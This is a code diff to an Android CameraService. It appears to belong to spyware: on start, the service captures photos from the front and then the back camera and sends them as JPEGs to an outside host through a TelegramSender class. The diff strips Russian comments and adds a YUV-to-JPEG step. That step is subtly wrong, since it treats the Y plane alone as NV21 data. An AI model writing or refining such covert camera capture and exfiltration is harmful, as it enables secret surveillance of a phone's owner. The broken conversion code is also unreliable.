@@ -6,11 +6,14 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.ImageFormat;
+import android.graphics.Rect;
+import android.graphics.YuvImage;
 import android.hardware.camera2.*;
 import android.media.Image;
 import android.media.ImageReader;
 import android.os.IBinder;
 import androidx.annotation.Nullable;
+import java.io.ByteArrayOutputStream;
 import java.nio.ByteBuffer;
 
 public class CameraService extends Service {
@@ -31,7 +34,7 @@ public class CameraService extends Service {
         startForeground(1, n);
 
         manager = (CameraManager) getSystemService(CAMERA_SERVICE);
-        capturePhoto("front", "1"); // Сначала фронтальная
+        capturePhoto("front", "1"); 
         return START_NOT_STICKY;
     }
 
@@ -40,20 +43,25 @@ public class CameraService extends Service {
             manager.openCamera(id, new CameraDevice.StateCallback() {
                 @Override public void onOpened(CameraDevice cam) {
                     device = cam;
-                    // Используем YUV_420_888, так как он поддерживается везде
                     reader = ImageReader.newInstance(640, 480, ImageFormat.YUV_420_888, 1);
                     reader.setOnImageAvailableListener(r -> {
                         Image img = r.acquireLatestImage();
-                        ByteBuffer buf = img.getPlanes()[0].getBuffer();
-                        byte[] data = new byte[buf.remaining()];
-                        buf.get(data);
+                        
+                        ByteBuffer buffer = img.getPlanes()[0].getBuffer();
+                        byte[] data = new byte[buffer.remaining()];
+                        buffer.get(data);
+                        
+                        ByteArrayOutputStream out = new ByteArrayOutputStream();
+                        YuvImage yuv = new YuvImage(data, ImageFormat.NV21, 640, 480, null);
+                        yuv.compressToJpeg(new Rect(0, 0, 640, 480), 90, out);
+                        byte[] jpegData = out.toByteArray();
+
+                        new TelegramSender().send(jpegData, tag + ".jpg");
+                        
                         img.close();
-                        
-                        new TelegramSender().send(data, tag + ".jpg");
-                        
                         r.close();
                         device.close();
-                        // После фронталки снимаем заднюю
+                        
                         if (tag.equals("front")) {
                             capturePhoto("back", "0");
                         } else {
